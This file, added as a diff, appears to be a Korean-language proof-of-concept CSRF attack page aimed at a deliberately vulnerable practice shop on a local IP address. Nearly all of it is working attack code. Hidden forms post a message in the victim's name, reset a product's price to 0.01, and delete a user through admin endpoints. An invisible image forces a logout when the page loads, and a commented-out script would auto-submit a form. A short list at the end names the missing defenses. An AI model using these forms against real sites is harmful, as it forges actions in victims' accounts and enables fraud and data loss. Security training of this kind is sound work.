@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - VULN SHOP</title>
+</head>
+<body>
+    <h1>CSRF 취약점 PoC</h1>
+
+    <h2>1. Q&A 게시판 글 작성 CSRF</h2>
+    <p>아래 버튼을 클릭하면 피해자의 계정으로 게시글이 작성됩니다.</p>
+    <form id="csrf-board" action="http://192.168.0.28:3000/board" method="POST">
+        <input type="hidden" name="content" value="CSRF 공격으로 작성된 게시글입니다!">
+        <button type="submit">게시글 작성 (CSRF)</button>
+    </form>
+
+    <hr>
+
+    <h2>2. 관리자 상품 가격 변경 CSRF</h2>
+    <p>관리자가 이 페이지를 방문하면 상품 가격이 변경됩니다.</p>
+    <form id="csrf-product" action="http://192.168.0.28:3000/admin/products/1" method="POST">
+        <input type="hidden" name="name" value="HACKED PRODUCT">
+        <input type="hidden" name="price" value="0.01">
+        <input type="hidden" name="description" value="가격이 CSRF로 변경됨">
+        <button type="submit">상품 가격 변경 (CSRF)</button>
+    </form>
+
+    <hr>
+
+    <h2>3. 사용자 삭제 CSRF (관리자 권한 필요)</h2>
+    <p>관리자가 이 페이지를 방문하면 사용자가 삭제됩니다.</p>
+    <form id="csrf-delete" action="http://192.168.0.28:3000/admin/users/3/delete" method="POST">
+        <button type="submit">사용자 삭제 (CSRF)</button>
+    </form>
+
+    <hr>
+
+    <h2>4. 자동 실행 CSRF (이미지 태그)</h2>
+    <p>페이지 로드 시 자동으로 실행됩니다.</p>
+    <!-- GET 요청으로 변환 가능한 경우 -->
+    <img src="http://192.168.0.28:3000/logout" style="display:none" onerror="console.log('CSRF via img')">
+
+    <hr>
+
+    <h2>5. 자동 제출 스크립트</h2>
+    <script>
+        // 페이지 로드 시 자동으로 폼 제출 (주석 해제하여 사용)
+        // document.getElementById('csrf-board').submit();
+    </script>
+
+    <h3>취약점 설명</h3>
+    <ul>
+        <li>CSRF 토큰이 없음</li>
+        <li>Referer/Origin 헤더 검증 없음</li>
+        <li>SameSite 쿠키 속성 미설정</li>
+        <li>모든 POST 요청이 CSRF에 취약</li>
+    </ul>
+</body>
+</html>
